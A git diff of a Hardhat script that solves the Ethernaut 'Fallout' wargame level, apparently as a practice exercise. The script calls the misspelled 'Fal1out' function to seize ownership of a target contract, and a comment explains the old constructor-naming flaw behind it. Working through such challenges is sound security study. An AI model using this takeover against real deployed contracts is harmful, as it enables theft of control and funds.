@@ -1,21 +1,17 @@
 import { Contract } from "ethers";
 import { ethers } from "hardhat";
-import { abi } from "../../artifacts/contracts/Fallout.sol/Fallout.json";
+import { abi } from "../../artifacts/contracts/2.Fallout/Fallout.sol/Fallout.json";
+import { displayResult } from "../../utils/displayResult";
 
-function setFalloutContract() {
-  const contractAddress = "0xD1015f7087B535c28fB8534395Adcf06725BAa18";
-  return new Contract(contractAddress, abi);
-}
+const targetAddress = "0x701E96faDeca9eD7C702af9A529070C490f9bFd4";
 
 async function main() {
-  const fallout = setFalloutContract();
   const [attacker] = await ethers.getSigners();
-  const pendingTx = await fallout.connect(attacker).Fal1out();
+  const fallout = new Contract(targetAddress, abi, attacker);
+  const pendingTx = await fallout.Fal1out();
   await pendingTx.wait();
-  console.log(
-    "Success: ",
-    (await fallout.connect(attacker).owner()) === attacker.address
-  );
+  const owner = await fallout.connect(attacker).owner();
+  displayResult(owner === attacker.address);
 }
 
 main().catch((error) => {
@@ -24,7 +20,8 @@ main().catch((error) => {
 });
 
 /* Explanation :
-In previous version of solidity, the constructor was named after the name of 
-the contract. Here Fal1out is mispelled, thus it is a regular public function,
+In solidity 0.6.0 and below, the constructor must be named after the name of 
+the contract. Here "Fal1out" is mispelled, thus it is a regular public function,
 callable by anyone.
+Here the function Fal1out is called, and the owner of the contract is changed to the attacker.
 */
